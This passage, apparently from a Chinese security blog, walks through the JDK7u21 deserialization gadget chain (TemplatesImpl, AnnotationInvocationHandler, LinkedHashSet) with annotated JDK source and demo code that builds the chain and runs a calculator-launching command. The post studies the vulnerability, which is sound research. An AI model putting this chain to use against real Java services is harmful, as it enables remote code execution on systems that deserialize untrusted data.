setFieldValue(templates, <span class="string">"_tfactory"</span>, <span class="keyword">new</span> TransformerFactoryImpl());</span><br><span class="line">        templates.newTransformer();</span><br></pre></td></tr></table></figure>



<p>在上面的代码示例中，是手动调用 <code>newTransformer()</code> 来触发恶意代码的执行，因此还需要找到一个能够在反序列化过程中，自动调用 (直接或间接) 该方法的类。</p>
<p>这里分为两部分,一部分是Javassist的动态注入，一部分是Templates 属性的设置。</p>
<blockquote>
<p>Javassist的作用:</p>
<p>通过动态字节码生成一个类，该类的静态代码块中存储恶意代码。</p>
<p>Templates属性设置的作用:</p>
<p>Templates.newTransformer() 实例化该恶意类从而触发其静态代码块中的恶意代码。</p>
</blockquote>
<p>这部分的理解，可以通过调试这个简单的触发语句来理解:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Example</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        TemplatesImpl calc = (TemplatesImpl) Gadgets.createTemplatesImpl(<span class="string">"open /Applications/Calculator.app/Contents/MacOS/Calculator"</span>);</span><br><span class="line">        calc.getOutputProperties();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以跟这个，看调用的细节：</p>
<p><img src="../images/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200908111442463.png" alt="image-20200908111442463"></p>
<p><code>AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();</code>调用<code>_class[_transletIndex]</code>类的无参构造方法,生成类对象。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">defineTransletClasses</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> TransformerConfigurationException </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 这里我们传入了值</span></span><br><span class="line">        <span class="keyword">if</span> (_bytecodes == <span class="keyword">null</span>) &#123;</span><br><span class="line">            ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 引入加载器</span></span><br><span class="line">        TransletClassLoader loader = (TransletClassLoader)</span><br><span class="line">            AccessController.doPrivileged(<span class="keyword">new</span> PrivilegedAction() &#123;</span><br><span class="line">                <span class="function"><span class="keyword">public</span> Object <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                  <span class="comment">// 这里在其他版本会有一句_tfactory.getExternalExtensionsMap()</span></span><br><span class="line">                  <span class="comment">// 为了防止出错，所以我们给_tfactory 设置 transFactory.newInstance() 这个带有getExternalExtensionsMap方法的实例</span></span><br><span class="line">                  <span class="comment">// 7u21版本下其实加不加都没关系。</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span> </span><br><span class="line">                      TransletClassLoader(ObjectFactory.findClassLoader());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="keyword">int</span> classCount = _bytecodes.length;</span><br><span class="line">            <span class="comment">// 根据_bytecodes传入的数目</span></span><br><span class="line">            _class = <span class="keyword">new</span> Class[classCount];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (classCount &gt; <span class="number">1</span>) &#123;</span><br><span class="line">                _auxClasses = <span class="keyword">new</span> Hashtable();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">                <span class="comment">// 加载字节码转化为对应的类</span></span><br><span class="line">                _class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line">                <span class="keyword">final</span> Class superClass = _class[i].getSuperclass();</span><br><span class="line"></span><br><span class="line">                <span class="comment">// Check if this is the main class</span></span><br><span class="line">                <span class="comment">// _transletIndex 默认值是-1</span></span><br><span class="line">                <span class="comment">// 所以为了不出错，所以这里字节码转换为对应类的时候，其父类必须是</span></span><br><span class="line">                <span class="comment">// ABSTRACT_TRANSLET = com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</span></span><br><span class="line">                <span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">                    _transletIndex = i;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    _auxClasses.put(_class[i].getName(), _class[i]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (_transletIndex &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                ErrorMsg err= <span class="keyword">new</span> ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (ClassFormatError e) &#123;</span><br><span class="line">            ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.TRANSLET_CLASS_ERR, _name);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (LinkageError e) &#123;</span><br><span class="line">            ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><code>_class[i] = loader.defineClass(_bytecodes[i]);</code> </p>
<p>加载类并不会触发静态方法,但是之后会有一个：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();</span><br></pre></td></tr></table></figure>

<p>进行实例化，从而触发我们javassist注入的静态恶意代码。</p>
<p>从上面我们简单归纳下执行的顺序:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>.TemplatesImpl.getOutputProperties()</span><br><span class="line"><span class="number">2</span>.TemplatesImpl.newTransformer()</span><br><span class="line"><span class="number">3</span>.TemplatesImpl.getTransletInstance()</span><br><span class="line"><span class="number">4</span>.TemplatesImpl.defineTransletClasses()</span><br><span class="line"><span class="number">5</span>.ClassLoader.defineClass()</span><br><span class="line"><span class="number">6</span>.Class.newInstance()</span><br></pre></td></tr></table></figure>

<p>1,2,3,4中都是可以触发的点，但是1,2 是<code>public</code>方法可以被对象直接调用，而3,4是<code>private</code>方法，只能被对象可调用方法间接调用。所以第二层的目标就是触发第一点或者第二点。</p>
<h2 id="2-AnnotationInvocationHandler"><a href="#2-AnnotationInvocationHandler" class="headerlink" title="2-AnnotationInvocationHandler"></a>2-AnnotationInvocationHandler</h2><p>进入第二阶段：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">InvocationHandler tempHandler = (InvocationHandler) Reflections.getFirstCtor(Gadgets.ANN_INV_HANDLER_CLASS).newInstance(Override<span class="class">.<span class="keyword">class</span>, <span class="title">map</span>)</span>;</span><br><span class="line">Reflections.setFieldValue(tempHandler, <span class="string">"type"</span>, Templates<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">Templates proxy = Gadgets.createProxy(tempHandler, Templates<span class="class">.<span class="keyword">class</span>)</span>;</span><br></pre></td></tr></table></figure>

<p>第二层的核心是怎么触发第一层的<code>TemplatesImpl.newTransformer()</code></p>
<p>这里选择<code>newTransformer()</code>方法来触发的</p>
<p>首先通过Reflections框架通过调用初始化函数创建一个AnnotationInvocationHandler对象实例。</p>
<p>然后设置了<code>type</code>属性为<code>Templates.class</code>；</p>
<p><img src="../images/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200908153232254.png" alt="image-20200908153232254"></p>
<p>这里被createProxy封装了。</p>
<p>在写个demo来debug理解：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.Gadgets;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.Reflections;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test2nd</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        TemplatesImpl calc = (TemplatesImpl) Gadgets.createTemplatesImpl(<span class="string">"open /Applications/Calculator.app/Contents/MacOS/Calculator"</span>);<span class="comment">//生成恶意的calc</span></span><br><span class="line">        HashMap map = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line">        InvocationHandler tempHandler = (InvocationHandler) Reflections.getFirstCtor(Gadgets.ANN_INV_HANDLER_CLASS).newInstance(Override<span class="class">.<span class="keyword">class</span>, <span class="title">map</span>)</span>;</span><br><span class="line">        Reflections.setFieldValue(tempHandler, <span class="string">"type"</span>, Templates<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        Templates proxy = Gadgets.createProxy(tempHandler, Templates<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        proxy.equals(calc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调用栈：</p>
<p><img src="../images/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200908154928091.png" alt="image-20200908154928091"></p>
<p>可以看到当调用方法名为<code>equals</code> 时，且参数个数和类型匹配，则调用内部 <code>equalsImpl</code> 方法</p>
<p><img src="../images/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200908155654212.png" alt="image-20200908155654212"></p>
<p>仔细看<code>equalsImpl</code>函数：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Boolean <span class="title">equalsImpl</span><span class="params">(Object var1)</span> </span>&#123;</span><br><span class="line">       <span class="comment">// 判断var1是否为AnnotationInvocationHandle,var1是templates，pass</span></span><br><span class="line">        <span class="keyword">if</span> (var1 == <span class="keyword">this</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">          <span class="comment">// 构造限制点，type属性限制了var1必须为this.type的类实例</span></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="keyword">this</span>.type.isInstance(var1)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//这里获取了当前成员的方法</span></span><br><span class="line">            Method[] var2 = <span class="keyword">this</span>.getMemberMethods();</span><br><span class="line">            <span class="keyword">int</span> var3 = var2.length;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> var4 = <span class="number">0</span>; var4 &lt; var3; ++var4) &#123;</span><br><span class="line">                Method var5 = var2[var4]; <span class="comment">//遍历获取方法</span></span><br><span class="line">                String var6 = var5.getName(); <span class="comment">//获取方法名字</span></span><br><span class="line">                Object var7 = <span class="keyword">this</span>.memberValues.get(var6);<span class="comment">//获取memberValues中的值</span></span><br><span class="line">                Object var8 = <span class="keyword">null</span>;</span><br><span class="line">                <span class="comment">// Proxy.isProxyClass(var1.getClass()</span></span><br><span class="line">                <span class="comment">// 判断varl是不是代理类,显然不是，pass</span></span><br><span class="line">                AnnotationInvocationHandler var9 = <span class="keyword">this</span>.asOneOfUs(var1);</span><br><span class="line">                <span class="keyword">if</span> (var9 != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    var8 = var9.memberValues.get(var6);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="comment">// 这里直接进行了方法的调用核心。</span></span><br><span class="line">                        <span class="comment">// var5是方法名,var1是可控的类</span></span><br><span class="line">                        <span class="comment">// var1.var5()</span></span><br><span class="line">                        var8 = var5.invoke(var1);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (InvocationTargetException var11) &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (IllegalAccessException var12) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> AssertionError(var12);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (!memberValueEquals(var7, var8)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>跟入后可以看到，首先获取 <code>type</code> Class 所有声明的方法，然后在参数 Object o 上使用反射调用方法，因此前面所说 <strong>TemplatesImpl</strong> 实例是需要作为参数传入：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Boolean <span class="title">equalsImpl</span><span class="params">(Object o)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// o 需要为 type 的实例</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">this</span>.type.isInstance(o)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125; </span><br><span class="line">        ...</span><br><span class="line">        <span class="comment">// 获取到 type Class 的方法</span></span><br><span class="line">        <span class="keyword">for</span> (Method memberMethod : getMemberMethods()) &#123;</span><br><span class="line">            ...</span><br><span class="line">            AnnotationInvocationHandler hisHandler = asOneOfUs(o);</span><br><span class="line">            <span class="keyword">if</span> (hisHandler != <span class="keyword">null</span>) &#123;</span><br><span class="line">                hisValue = hisHandler.memberValues.get(member);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 反射调用方法</span></span><br><span class="line">                hisValue = memberMethod.invoke(o);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>目的是触发<code>TemplatesImpl.newTransformer()</code></p>
<p>var1可以通过<code>proxy(var1)</code>方式去控制,那么var5怎么去控制呢？</p>
<p><code>Method[] var2 = this.getMemberMethods();</code> 可以看到这里获取了成员的方法，跟进去看看。</p>
<p><img src="../images/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200909093606391.png" alt="image-20200909093606391"></p>
<p>理一下思路</p>
<ol>
<li>根据 <strong>TemplatesImpl</strong> 部分的说明，创建一个包含恶意代码的 TemplatesImpl 实例 <code>evilTemplates</code></li>
<li>使用 AnnotationInvocationHandler 创建 proxy object 代理 Templates 接口 (会使用到反射)</li>
<li>调用 proxy object 的 <code>equals</code> 方法，将 <code>evilTemplates</code> 作为参数</li>
</ol>
<p>例子：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testTemplateImpl</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Map map = <span class="keyword">new</span> HashMap();</span><br><span class="line">        <span class="comment">//  AnnotationInvocationHandler 构造方法为 package private，需要使用反射创建实例</span></span><br><span class="line">        <span class="keyword">final</span> Constructor&lt;?&gt; ctor = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">// 构造 payload 时，因为新版 jdk 对 type 参数做了校验，必须为 Annotation</span></span><br><span class="line">        <span class="comment">// 为了不报错，所以设置为任意一个 Annotation，再用反射修改 type 参数</span></span><br><span class="line">        InvocationHandler invocationHandler = (InvocationHandler) ctor.newInstance(Override<span class="class">.<span class="keyword">class</span>, <span class="title">map</span>)</span>;</span><br><span class="line">        <span class="comment">// 反射设置属性值</span></span><br><span class="line">        setFieldValue(invocationHandler, <span class="string">"type"</span>, Templates<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">        <span class="comment">// 代理 Tempaltes 接口</span></span><br><span class="line">        Templates proxy = (Templates) Proxy.newProxyInstance(InvocationHandler.class.getClassLoader(), new Class[]&#123;Templates.class&#125;, invocationHandler);</span><br><span class="line">        <span class="comment">// 获取包含恶意代码的 Templates 对象</span></span><br><span class="line">        Templates evilTemplates = getEvilTemplates();</span><br><span class="line">        <span class="comment">// 触发恶意代码执行</span></span><br><span class="line">        proxy.equals(evilTemplates);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>结果发现是通过反射机制从<code>this.type</code>这个类属性去获取的。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Reflections.setFieldValue(tempHandler, &quot;type&quot;, Templates.class);</span><br></pre></td></tr></table></figure>

<p>所以这里我们只要控制type为<code>Templates.class</code>就行了。</p>
<p><img src="../images/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200909093451311.png" alt="image-20200909093451311"></p>
<p>里面就有<code>newTransformer</code>方法,且为第一个,如果是第二个、第三个话,前面可能会因为参数不对等原因出现错误，导致程序没能执行到<code>newTransformer</code>方法就中断了。</p>
<h2 id="3-LinkedHashSet"><a href="#3-LinkedHashSet" class="headerlink" title="3-LinkedHashSet"></a>3-LinkedHashSet</h2><p>第三层的核心就是触发<code>proxy.equals(calc);</code></p>
<p><img src="../images/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200909094010990.png" alt="image-20200909094010990"></p>
<p>这是最外层<code>LinkedHashSet</code>,这个对象在反序列化的时候会自动触发<code>readObject</code>方法,从而开始了exp的执行流程</p>
<p>在利用 payload 中，LinkedHashSet 是最外层的类，包含恶意代码的实例和proxy object 会作为元素添加到 set 中，在反序列化过程中，会调用到前一部分所说的 <code>equals</code> 方法，来具体看一下。</p>
<p>LinkedHashSet 位于 <code>java.util</code> 包中，是 HashSet 的子类，添加到 set 的元素会保持有序状态，<strong>内部实现基于 HashMap</strong>。</p>
<p>问题是如何触发equals方法，接下来仔细看一下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LinkedHashSet</span>&lt;<span class="title">E</span>&gt;</span></span><br><span class="line"><span class="class">    <span class="keyword">extends</span> <span class="title">HashSet</span>&lt;<span class="title">E</span>&gt;</span></span><br><span class="line"><span class="class">    <span class="keyword">implements</span> <span class="title">Set</span>&lt;<span class="title">E</span>&gt;, <span class="title">Cloneable</span>, <span class="title">java</span>.<span class="title">io</span>.<span class="title">Serializable</span> </span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在 HashSet 的 <code>writeObject()</code> 方法中，会依次调用每个元素的 <code>writeObject()</code> 方法来实现序列化：</p>
<p><img src="../images/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200909165142380.png" alt="image-20200909165142380"></p>
<p>通过查看序列化规则<code>writeObject</code>：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> java.io.IOException </span>&#123;</span><br><span class="line">        <span class="comment">// Write out any hidden serialization magic</span></span><br><span class="line">        s.defaultWriteObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Write out HashMap capacity and load factor</span></span><br><span class="line">        s.writeInt(map.capacity());</span><br><span class="line">        s.writeFloat(map.loadFactor());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Write out size</span></span><br><span class="line">        s.writeInt(map.size());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Write out all elements in the proper order.</span></span><br><span class="line">        <span class="keyword">for</span> (E e : map.keySet())</span><br><span class="line">            s.writeObject(e);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>逻辑规则：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">s.defaultWriteObject();</span><br><span class="line">s.writeInt(map.capacity());</span><br><span class="line">s.writeFloat(map.loadFactor());</span><br><span class="line">s.writeInt(map.size());</span><br><span class="line"><span class="keyword">for</span> (E e : map.keySet())</span><br><span class="line">			s.writeObject(e);</span><br></pre></td></tr></table></figure>

<p>相应的，在反序列化过程中，会依次调用每个元素的 <code>readObject()</code> 方法，然后将其作为 <code>key</code> (value 为固定值) 依次放入 HashMap 中：</p>
<p><img src="../images/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200909162106301.png" alt="image-20200909162106301"></p>
<p>来看一下 <code>HashMap</code> 的 <code>put()</code> 方法，首先会调用内部 <code>hash()</code> 函数计算 key 的 hash 值，然后遍历所有元素，*<em>当要插入的元素的 hash 和已有 entry 相同，且 key 和 Entry的 key 指向同一个对象 或 二者equals时 *</em>，则认为 key 已经存在，返回 oldValue，否则调用 <code>addEntry()</code> 添加元素：</p>
<p><img src="../images/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20200909171939978.png" alt="image-20200909171939978"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> V <span class="title">put</span><span class="params">(K key, V value)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (key == <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span> putForNullKey(value);</span><br><span class="line">        <span class="comment">// 计算 key 的 hash 值</span></span><br><span class="line">        <span class="keyword">int</span> hash = hash(key);</span><br><span class="line">        <span class="keyword">int</span> i = indexFor(hash, table.length);</span><br><span class="line">        <span class="comment">// 遍历已有元素，检查 key 是否已经存在</span></span><br><span class="line">        <span class="keyword">for</span> (Entry&lt;K,V&gt; e = table[i]; e != <span class="keyword">null</span>; e = e.next) &#123;</span><br><span class="line">            Object k;</span><br><span class="line">            <span class="comment">// hash 值相同，且key和Entry的key指向同一个对象 或 二者equals</span></span><br><span class="line">            <span class="keyword">if</span> (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) &#123;</span><br><span class="line">                V oldValue = e.value;</span><br><span class="line">                e.value = value;</span><br><span class="line">                e.recordAccess(<span class="keyword">this</span>);</span><br><span class="line">                <span class="keyword">return</span> oldValue;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        modCount++;</span><br><span class="line">        addEntry(hash, key, value, i);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><strong>代码中将已有元素的 *key* 值作为参数 (k 变量)，调用了插入 key 的 <code>equals</code> 方法来判断而这是否相等</strong>，这里我们只要反序列化过程中让 proxy object 先添加，然后再添加包含恶意代码的实例 (序列化时添加要顺序相反)。</p>
<p>理一下思路</p>
<ul>
<li>创建一个 LinkedHashSet</li>
<li>先将 包含恶意代码的 Templates 对象添加到 hashSet 中</li>
<li>将使用 AnnotationInvocationHandler 创建的proxy object (代理 Templaes 接口) 添加到 hashSet 中，在反序列化过程中，会调用 proxy 的 equals 方法 (包含恶意代码的Templates 对象作为参数)，触发恶意代码执行</li>
</ul>
<p>在反序列化过程中，需要保证 HashSet 内的 entry 保持有序，这也是为什么使用 <code>LinkedHashSet</code> 的原因。</p>
<p>根据代码分析，在执行到 <code>equals()</code> 之前，需要满足两个条件</p>
<ol>
<li>e.hash == hash</li>
<li>(k = e.key) != key</li>
</ol>
<p>条件 2 比较两个变量是否指向同一个对象，这里满足(一个为包含恶意代码的templates 实例，一个为proxy object)，条件1判断的是 hash 值是否相等，来看一下 hash 值是如何计算的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hash</span><span class="params">(Object k)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> h = <span class="number">0</span>;</span><br><span class="line">  ...</span><br><span class="line">    <span class="comment">// 调用了 k 的 hashCode</span></span><br><span class="line">    h ^= k.hashCode();</span><br><span class="line"></span><br><span class="line">  h ^= (h &gt;&gt;&gt; <span class="number">20</span>) ^ (h &gt;&gt;&gt; <span class="number">12</span>);</span><br><span class="line">  <span class="keyword">return</span> h ^ (h &gt;&gt;&gt; <span class="number">7</span>) ^ (h &gt;&gt;&gt; <span class="number">4</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到，计算结果只受 <code>k.hashCode()</code> 的影响</p>
<ul>
<li><strong>对于普通对象，返回的是就是 <code>k.hashCode()</code></strong></li>
<li>对用 proxy object，因为会统一调用 <code>inove()</code> ，而<code>AnnotationInvocationHandler</code> 在 <code>inove()</code> 方法中提供了 <code>hashCode()</code> 的实现，代码如下，内部调用了 <code>hashCodeImpl()</code></li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object obj, Method method, Object[] args)</span> </span>&#123;</span><br><span class="line">  String methodName = method.getName();</span><br><span class="line">    ...</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (methodName.equals(<span class="string">"hashCode"</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.hashCodeImpl();</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>hashCodeImpl()</code> 代码如下 ，这里稍微修改了下代码，便于理解</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">hashCodeImpl</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">// 遍历 memberValues</span></span><br><span class="line">  Iterator itr = <span class="keyword">this</span>.memberValues.entrySet().iterator();</span><br><span class="line">  <span class="keyword">for</span>( ;itr.hasNext(); ) &#123;</span><br><span class="line">      Entry entry = (Entry)itr.next();</span><br><span class="line">      String key = ((String)entry.getKey());</span><br><span class="line">      Object value = entry.getValue();</span><br><span class="line">      <span class="comment">// 127 * key 的 hashCode，再和 memberValueHashCode(value) 进行异或</span></span><br><span class="line">      result += <span class="number">127</span> * key.hashCode() ^ memberValueHashCode(value);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>for 循环内调用了 <code>memberValueHashCode()</code> 函数，其精简代码如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">memberValueHashCode</span><span class="params">(Object var0)</span> </span>&#123;</span><br><span class="line">        Class var1 = var0.getClass();</span><br><span class="line">        <span class="keyword">if</span> (!var1.isArray()) &#123; <span class="comment">// 匹配到该条件</span></span><br><span class="line">            <span class="keyword">return</span> var0.hashCode();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var1 == <span class="keyword">byte</span>[]<span class="class">.<span class="keyword">class</span>) </span>&#123;</span><br><span class="line">            ....</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            ...</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>for 循环内调用了 <code>memberValueHashCode()</code> 函数，其精简代码如下</p>
